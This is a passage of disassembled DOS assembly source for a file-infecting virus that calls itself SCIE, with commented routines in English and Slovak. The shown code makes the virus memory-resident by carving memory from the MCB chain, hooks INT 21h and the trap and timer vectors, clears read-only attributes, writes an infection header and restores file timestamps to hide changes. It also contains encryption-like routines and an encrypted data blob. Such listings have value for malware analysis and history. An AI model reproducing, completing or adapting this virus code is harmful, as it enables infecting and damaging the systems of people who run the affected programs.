		cmp	byte ptr ds:data_52e,0	; (6C03:005B=0)
		je	loc_45			; Jump if equal
		mul	word ptr ds:data_58e	; (6C03:0062=0) ax = data * ax
		mov	byte ptr ds:data_24e,0E9h	; (6C03:000A=0)
		add	ax,7CEh
		mov	word ptr ds:data_24e+1,ax	; (6C03:000B=0)
		jmp	short loc_46		; (0B8E)
loc_45:
		mov	ds:data_35e,ax		; (6C03:0020=0)
		mov	word ptr ds:data_34e,7D1h	; (6C03:001E=0)
		mul	word ptr ds:data_58e	; (6C03:0062=0) ax = data * ax
		add	ax,0B40h
		adc	dx,0
		div	word ptr ds:data_60e	; (6C03:0066=0) ax,dxrem=dx:ax/data
		inc	ax
		mov	ds:data_27e,ax		; (6C03:000E=0)
		mov	word ptr ds:data_24e+2,dx	; (6C03:000C=0)
		mov	ax,ds:data_30e		; (6C03:0012=0)
		sub	ds:data_35e,ax		; (6C03:0020=0)
		mov	si,14h
		call	sub_1			; (062E)
		mov	si,16h
		call	sub_1			; (062E)
loc_46:
		xor	cx,cx
		mov	dx,cx
		call	v_2moveFP		; (0848)
		mov	dx,0Ah
		mov	cx,20h
		call	v_filewrite		; (083A)
loc_47:
		push	word ptr [bp+0Eh]
		push	word ptr [bp+6]
		call	v_fileDN
		add	sp,4
loc_48:
		mov	byte ptr ds:data_53e,0FFh	; (6C03:005C=0)
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	si
		pop	di
		pop	bp
		pop	ds
		pop	es
		popf				; Pop flags
loc_49:
		pushf				; Push flags
		push	cs
		push	word ptr cs:data_61e	; (6C03:0068=0)
		cmp	byte ptr cs:data_51e,0	; (6C03:005A=0)
		jne	loc_50			; Jump if not equal
		iret				; Interrupt return
loc_50:
		push	bp
		mov	bp,sp
		or	word ptr [bp+6],100h
		mov	byte ptr cs:data_51e,0	; (6C03:005A=0)
		pop	bp
		iret				; Interrupt return
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;   File manipulation
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
;
;  in: stack contains pointer to pathname  
v_fileUP	proc	near
		push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	ax,3300h
		call	v_doscall		; Get Control-C Check
		mov	ds:d_ctrlc,dl
		mov	ax,3301h
		xor	dl,dl			; Set Control-C Check OFF
		call	v_doscall
		mov	ax,3524h		; Get interrupt
		call	v_doscall		;   (Critical Error Handler)
		mov	ds:d_cerrS,es
		mov	ds:d_cerrO,bx
		mov	dx,384h
		mov	ax,2524h		; Set interrupt
		call	v_doscall		;   (Critcal Error Handler)
		mov	ax,4300h
		push	ds
		lds	dx,dword ptr [bp+4]	; Pointer to pathname
		call	v_doscall		; Get file attributes
		pop	ds
		jc	v_ferr			; file error
		mov	ds:d_fattr,cl
		test	cl,1
		jz	loc_51			; if file is not R/O
		mov	ax,4301h
		push	ds
		xor	cx,cx
		lds	dx,dword ptr [bp+4]	; Pointer to pathname
		call	v_doscall		; Set file attributes to R/W
		pop	ds
		jc	v_ferr			; file error
loc_51:		mov	ax,3D02h
		push	ds
		lds	dx,dword ptr [bp+4]	; Pointer to pathname
		call	v_doscall		; Open Handle
		pop	ds
		jc	loc_52
		mov	ds:d_fhand,ax		; AX contains file handle
		mov	ax,5700h
		call	v_2doscall		; Get date/time of file
		mov	ds:d_ftime,cx		;   Time
		mov	ds:d_fdate,dx		;   Date
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	es
		pop	bp
		clc				; Clear carry flag
		retn
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
v_fileDN:	push	bp
		mov	bp,sp
		push	es
		push	dx
		push	cx
		push	bx
		push	ax
		mov	cx,ds:d_ftime		; Orig. file time
		mov	dx,ds:d_fdate		; Orig. file date
		mov	ax,5701h		; Set file date/time
		call	v_2doscall
		mov	ah,3Eh			; Close file handle
		call	v_2doscall
loc_52:		mov	cl,ds:d_fattr		; Orig. file attributes
		xor	cl,20h
		and	cl,3Fh
		test	cl,21h
		jz	v_ferr
		mov	ax,4301h
		push	ds
		xor	ch,ch
		mov	cl,ds:d_fattr
		lds	dx,dword ptr [bp+4]	; Pointer to pathname
		call	v_doscall		; Set file attributes
		pop	ds
v_ferr:		mov	ax,2524h
		push	ds
		lds	dx,dword ptr ds:d_cerrO	; Orig. Critical error handler
		call	v_doscall		; Set interrupt
		pop	ds			;   (Critical error handler)
		mov	dl,ds:d_ctrlc		; Orig. Ctrl-C check
		mov	ax,3301h		; Set Ctrl-C check
		call	v_doscall
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	es
		pop	bp
		stc
		retn
v_fileUP	endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_17		proc	near
		pop	cx
		mov	dx,200h
	;	cmp	byte ptr cs:[bx+5Ah],0
		db	2eh,80h,0bfh,5ah,0,0	;*Fixup for MASM (M)
		je	loc_54			; Jump if equal
		mov	dh,3
loc_54:
		push	dx
		push	cs
		push	cx
		inc	bx
		iret				; Interrupt return
sub_17		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;  Begin of SCIE virus body
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
v_entry:	call	s_mainvir
s_mainvir	proc	near
		pop	bx			; Get actual offset adr.
		sub	bx,7D4h
	;	mov	byte ptr cs:[bx+5Ch],0FFh
						db	2eh,0c6h,87h,5ch,0,0ffh	;*
		cld				; Clear direction
	;	cmp	byte ptr cs:[bx+5Bh],0	;? EXE/COM flag
						db	2eh,80h,0bfh,5bh,0,0	;*
		je	loc_56			;? jump for .EXE files
		mov	si,0Ah
		add	si,bx
		mov	di,100h			; Move orig. first 32 bytes
		mov	cx,32			; to begin of .COM file
		rep	movsb
		push	cs
	;	push	word ptr cs:data_59e[bx]	; (6C03:0064=0)
						db	2eh,0ffh,0b7h,64h,0	;*
		push	es
		push	ds
		push	ax
		jmp	short loc_57		; (0D03)
loc_56:		mov	dx,ds
		add	dx,10h
		add	dx,cs:data_35e		; (6C03:0020=0)
		push	dx
		push	word ptr cs:data_34e	; (6C03:001E=0)
		push	es
		push	ds
		push	ax

loc_57:		push	bx			; .EXE or .COM O.K.
		mov	bx,2Ch
		clc
		mov	ax,0C603h		; Test
		int	21h			;  if SCIE is installed
		pop	bx
		jnc	loc_59			; SCIE isn't in memory
v_mexit:
		pop	ax			; SCIE is in memory
		pop	ds
		pop	es
		call	sub_17
		retf
loc_59:	;	cmp	byte ptr cs:[bx+5Bh],0
						db	2eh,80h,0bfh,5bh,0,0	;*
		je	loc_60			; not for .COM files  ak je EXE
		cmp	sp,0FFF0h		; is stack > 16 bytes ?
		jb	v_mexit			;  NO!
loc_60:		mov	ax,ds                   ; AX=DS points to PSP
		dec	ax
		mov	es,ax                   ; ES=AX points to MCB
		cmp	byte ptr es:data_18e,'Z'  ; TRS programm ?   (last MCB?)
	;	je	loc_83			; Spare my work!     (if last g.83)
						db	74h, 32h ;*
		push	bx
		mov	ah,48h
		mov	bx,0FFFFh
		int	21h			; Amount of free momory ?
		cmp	bx,188			;  188 paragraphs = 3008 bytes
		jb	loc_61			; Sorry, too little memory
		mov	ah,48h			; Alocate 3008 bytes
		int	21h
loc_61:		pop	bx
		jc	v_mexit			; Memory allocation error
		dec	ax			; Segment off alloc. memory - 1
		mov	es,ax			; ES ukazuje na zaciatok MCB
		cli				; Disable interrupts
		mov	word ptr es:d_memown,0  ; Set own itself
		cmp	byte ptr es:d_memtyp,'Z' ; Last block?
		jne	v_mexit			;   NO!
		add	ax,word ptr es:[3]	; Alloc. block size
		inc	ax			;   +1
		mov	word ptr es:[12h],ax	; Save original size
loc_83:
		mov	ax,word ptr es:[3]	; AX = Alloc. block size  (ES points to MCB)
		sub	ax,0BCh                 ; 188 paragraphs = 3008 bytes
		jc	v_mexit			; Sorry too little mem block
		mov	word ptr es:[3],ax	; Zmensim velkost volnej pamate o BCh (povodna-BCh)
		sub	word ptr es:[12h],0BCh	; Zmensim v PSP MemTop o BCh  (Koniec pamate - bch)
		mov	es,word ptr es:[12h]    ; ES=zaciatok tejto "ukradnutej" pamate
		xor	di,di
		mov	si,bx
		mov	cx,2880			; prekopirujem z DS:SI do ES:DI 2880 bytes
	;	rep	cs:movsb                ;
						db	0f3h, 2eh, 0a4h ;*
		push	es                      ; DS:0 ukazuje na tento prekopirovany blok
		pop	ds
		push	bx
		mov	ax,3521h
		int	21h			; Get DOS main int. vector
		mov	word ptr ds:[2ch],es	;  and save it to allocated
		mov	word ptr ds:[2ah],bx	;  memory
		mov	word ptr ds:d_int21+2,es
		mov	word ptr ds:d_int21,bx
		mov	ax,3501h
		int	21h			; Get TRAP vector
		mov	si,bx			; Store to di:si
		mov	di,es
		mov	ax,351ch
		int	21h			; Get User timer tick vector
		mov	word ptr ds:d_uttick+2,es ;  and save it to allocated
		mov	word ptr ds:d_uttick,bx   ;  memory
		pop	bx                      ; restore BX
		mov	ax,2521h		; Set New int 21h vector
		mov	dx,v_new21-begSCIE-8	; to allocated memory
		int	21h
		mov	ax,2501h		; Set New TRAP vector
		mov	dx,8f7h			; to allocated memory
		int	21h

		mov	dx,237h
		pushf
		mov	ax,bx
		add	ax,092ch
		push	cs
		push	ax
		cli				; Disable interrupts
		pushf
		pop	ax                      ; flags in AX
		or	ax,0100h		; Prepare flags with TRAP on
		push	ax                      ; flags on stack
		mov	ax,bx
		add	ax,02d4h
		push	cs
		push	ax
		mov	ax,251ch		; prepare for Set int 1ch vector
		mov	byte ptr ds:[56h],1
		iret				; iret with TRAP on !
						;   is equ to jmp new TRAP

		push	bp
		mov	bp,sp
		cmp	cs:byte ptr 56h,1
		je	loc_f1
loc_62:		and	word ptr [bp+6],0FEFFh
		mov	byte ptr cs:data_47e,0	; (6C03:0056=0)
		pop	bp
		iret				; Interrupt return
s_mainvir	endp

loc_f1:		cmp	word ptr [bp+4],300h
		jb	loc_63			; Jump if below
		pop	bp
		iret				; Interrupt return
loc_63:
		push	bx
		mov	bx,[bp+2]
		mov	cs:d_int21,bx		; (6C03:002E=0)
		mov	bx,[bp+4]
		mov	word ptr cs:d_int21+2,bx	; (6C03:0030=0)
		pop	bx
		jmp	short loc_62		; (0DF2)
		mov	byte ptr ds:data_47e,0	; (6C03:0056=0)
		mov	ax,2501h
		mov	dx,si
		mov	ds,di
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	word ptr ds:data_10e,397Fh	; (0000:00C5=6A14h)
		mov	byte ptr ds:data_11e,2Ch	; (0000:00C7=2) ','
		mov	ax,ds:data_13e		; (0000:0413=27Fh)
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		mov	ds,ax
		mov	si,12Eh
		xor	ax,ax			; Zero register
		mov	cx,61h
  
locloop_64:
		add	ax,[si]
		add	si,2
		loop	locloop_64		; Loop if cx > 0
  
		cmp	ax,53Bh
		je	loc_65			; Jump if equal
		jmp	v_mexit			; (0D10)
loc_65:
		cli				; Disable interrupts
		mov	byte ptr ds:data_76e,1	; (9FC0:017A=0)
		mov	byte ptr ds:data_77e,1	; (9FC0:01FB=0)
		mov	byte ptr ds:data_74e,0E9h	; (9FC0:0093=0)
		mov	word ptr ds:data_75e,341h	; (9FC0:0094=0)
		push	ds
		pop	es
		push	cs
		pop	ds
		mov	si,bx
		add	si,117h
		mov	di,3D7h
		mov	cx,27h
		rep	movsb			; Rep while cx>0 Mov [si] to es:[di]
		sti				; Enable interrupts
		jmp	v_mexit			; (0D10)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_19		proc	near
		push	bp
		mov	bp,sp
		push	cx
		mov	ax,8000h
		xor	cx,cx			; Zero register
loc_66:
		test	ax,[bp+8]
		jnz	loc_67			; Jump if not zero
		inc	cx
		shr	ax,1			; Shift w/zeros fill
		jmp	short loc_66		; (0E8E)
loc_67:
		xor	ax,[bp+8]
		jz	loc_68			; Jump if zero
		mov	ax,[bp+4]
		add	ax,[bp+8]
		add	ax,cx
		sub	ax,11h
		clc				; Clear carry flag
		pop	cx
		pop	bp
		retn
loc_68:
		mov	ax,0Fh
		sub	ax,cx
		add	ax,[bp+6]
		stc				; Set carry flag
		pop	cx
		pop	bp
		retn
sub_19		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_20		proc	near
		push	bp
		mov	bp,sp
		sub	sp,10h
		mov	dx,8000h
loc_69:
		test	dx,[bp+8]
		jnz	loc_70			; Jump if not zero
		shr	dx,1			; Shift w/zeros fill
		jmp	short loc_69		; (0EC1)
loc_70:
;*		lea	di,cs:[0FFF0h][bp]	; Load effective addr
		db	8Dh, 7Eh, 0F0h		; Fixup for MASM (Z)
		mov	cx,8
		xor	ax,ax			; Zero register
		push	ss
		pop	es
		rep	stosw			; Rep while cx>0 Store ax to es:[di]
		mov	cx,[bp+8]
loc_71:
		test	cx,dx
		jz	loc_72			; Jump if zero
		push	cx
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_19			; (0E85)
		mov	es,ax
		lahf				; Load ah from flags
		add	sp,6
		sahf				; Store ah into flags
;*		jc	loc_84			;*Jump if carry Set
		db	72h, 3Ah
		mov	ax,es:data_1e		; (0000:0000=56E8h)
		xor	[bp-10h],ax
		mov	ax,es:data_2e		; (0000:0002=26Ah)
		xor	[bp-0Eh],ax
		mov	ax,es:data_3e		; (0000:0004=756h)
		xor	[bp-0Ch],ax
		mov	ax,es:data_4e		; (0000:0006=70h)
		xor	[bp-0Ah],ax
		mov	ax,es:data_5e		; (0000:0008=16h)
		xor	[bp-8],ax
		mov	ax,es:data_6e		; (0000:000A=0E7Ch)
		xor	[bp-6],ax
		mov	ax,es:data_7e		; (0000:000C=756h)
		xor	[bp-4],ax
		mov	ax,es:data_8e		; (0000:000E=70h)
		xor	[bp-2],ax
		jmp	short loc_72		; (0F3B)
loc_84:
		mov	ax,cx
		mov	cx,8
;*		lea	si,cs:[0FFF0h][bp]	; Load effective addr
		db	8Dh, 76h, 0F0h		; Fixup for MASM (Z)
		xor	di,di			; Zero register
		db	0F3h, 36h, 0A5h, 8Bh, 0C8h, 0EBh
		db	3
loc_72:
		dec	cx
		jmp	short loc_71		; (0ED9)
sub_20		endp
  
		shr	dx,1			; Shift w/zeros fill
		jc	loc_73			; Jump if carry Set
		jmp	short loc_70		; (0ECA)
loc_73:
		mov	sp,bp
		pop	bp
		retn
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_21		proc	near
		push	bp
		mov	bp,sp
		push	ds
loc_74:
		mov	ds,[bp+4]
		mov	es,[bp+6]
		xor	bx,bx			; Zero register
loc_75:
		mov	ax,es:[bx]
		xor	[bx],ax
		add	bx,2
		cmp	bx,10h
		jb	loc_75			; Jump if below
		inc	word ptr [bp+4]
		inc	word ptr [bp+6]
		dec	word ptr [bp+8]
		jnz	loc_74			; Jump if not zero
		pop	ds
		pop	bp
		retn
sub_21		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_22		proc	near
		push	bp
		mov	bp,sp
		push	ds
		mov	bl,1
loc_76:
		xor	si,si			; Zero register
loc_77:
		xor	cx,cx			; Zero register
		mov	di,[bp+8]
		add	di,[bp+0Ah]
		dec	di
loc_78:
		mov	ds,di
		shr	byte ptr [si],1		; Shift w/zeros fill
		rcl	cx,1			; Rotate thru carry
		dec	di
		cmp	di,[bp+8]
		jae	loc_78			; Jump if above or =
		or	cx,cx			; Zero ?
		jz	loc_80			; Jump if zero
		push	cx
		push	word ptr [bp+6]
		push	word ptr [bp+4]
		call	sub_19			; (0E85)
		add	sp,6
		mov	ds,ax
		xor	[si],bl
loc_80:
		inc	si
		cmp	si,10h
		jb	loc_77			; Jump if below
		shl	bl,1			; Shift w/zeros fill
		jnc	loc_76			; Jump if carry=0
		pop	ds
		pop	bp
		retn
sub_22		endp
  
		xchg	bx,bx
		db	88h,0cbh		; mov	bl,cl
		mov	bl,ds:data_72e[bx+di]	; (6C03:388F=0)
		out	0CDh,ax			; port CDh
		mov	ax,ds:data_73e		; (6C03:3E9B=0)
		out	dx,ax			; port 0, DMA-1 bas&add ch 0
		xchg	cl,al
		xchg	ax,di
		adc	word ptr [bp+si+34h],0FFBEh
		db	8Ch, 21h, 29h, 0B1h, 0F9h, 0C1h
		db	9Bh, 12h, 4, 9, 0F3h, 45h
		db	1, 93h, 1Dh, 0B0h, 0B9h, 0C6h
		db	1, 6, 92h, 37h, 50h, 49h
		db	0E8h, 0D5h, 71h, 97h, 22h, 0A6h
		db	0E6h, 4Ch, 50h, 0BEh, 2Ah, 23h
		db	0BEh, 44h, 1Dh, 0A1h, 0A6h, 6Bh
		db	0A0h, 0E0h, 6, 0AAh, 1Ah, 0F6h
		db	2Ah, 0C0h, 2, 2Fh, 75h, 99h
		db	6, 0Fh, 5Bh, 97h, 2, 3Eh
		db	64h, 7Dh, 0C8h, 50h, 66h, 8
		db	0C4h, 0FAh, 92h, 8Eh, 64h, 75h
		db	1Bh, 0A6h, 1Bh, 0B9h, 32h, 0BDh
		db	0Bh, 3Eh, 61h, 6Dh, 0E0h, 0C4h
		db	0B9h, 29h, 0CAh, 9Ch, 17h, 8
		db	21h, 0EAh, 0EEh, 7Eh, 85h, 0B1h
		db	63h, 2Ah, 0C3h, 71h, 71h, 2Ch
		db	0A0h, 0F2h, 8Bh, 59h, 0Dh, 0F9h
		db	0D5h, 0, 0F4h, 7Ah, 2Ch, 0
  
seg_a		ends
  
  
  
		end	start

